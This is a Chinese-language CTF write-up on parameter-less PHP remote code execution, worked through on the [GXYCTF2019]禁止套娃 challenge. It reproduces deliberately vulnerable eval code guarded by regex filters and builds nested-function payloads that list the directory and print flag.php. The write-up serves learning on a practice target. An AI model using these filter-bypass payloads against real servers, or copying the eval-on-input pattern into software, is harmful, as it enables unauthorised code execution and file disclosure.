# 0x00前言
刷buu的时候遇到一道题，[GXYCTF2019]禁止套娃，涉及到无参数RCE，但是我不会，记录一下学习过程。  
**实例**
    if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) { 
    eval($_GET['code']);
    }
    preg_replace('/[a-z]+\((?R)?\)/', NULL, $code)
    pre_match('/et|na|nt|strlen|info|path||rand|dec|bin|hex|oct|pi|exp|log/i', $code))
**解析**
    preg_replace 的主要功能就是限制我们传输进来的必须是纯小写字母的函数，而且不能携带参数。
    再来看一下：(?R)?，这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数）
    preg_match的主要功能就是过滤函数，把一些常用不带参数的函数关键部分都给过滤了，需要去构造别的方法去执行命令。
说白了就是传入的参数不能含有参数
    scandir（'a()'）//可以使用，里面没有参数
    scandir（'123'）//不可以使用，里面有参数
所谓无参数`RCE`说白了就是使用一个个的函数来达到我们的目的。  
例如`print_r(array_reverse(scandir(current(localeconv()))))`  
接下来就说说由哪些方法能完成RCE  
**测试代码**
    ";
    if(isset($_GET['exp'])){
        if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
            if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
                if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                    // echo $_GET['exp'];
                    @eval($_GET['exp']);
                }
                else{
                    die("还差一点哦！");
                }
            }
            else{
                die("再好好想想！");
            }
        }
        else{
            die("还想读flag，臭弟弟！");
        }
    }
    // highlight_file(__FILE__);
    ?>
查看代码，很明显的无参数RCE  
其中`(?R)`引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数  
`scandir('.')`返回当前目录，但是如何构造`.` 函数`localeconv()` 返回一包含本地数字及货币格式信息的数组。
但是其数组第一项就是`.`， `current()/pos()`返回数组中的当前单元, 默认取第一个值。  
构造payload
    ?exp=print_r(scandir(pos(localeconv())));
利用对数组操作的函数读取flag  
利用`array_reverse()` 将数组内容反转一下 ， 利用`next()`指向第二个元素，也就是flag.php
    ?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));
# 0x02 后记
在没学习之前觉得这个知识点可能会很难，现在倒也觉得没有我想的那么难。有些东西做了才知道深浅。继续加油吧。
**参考**  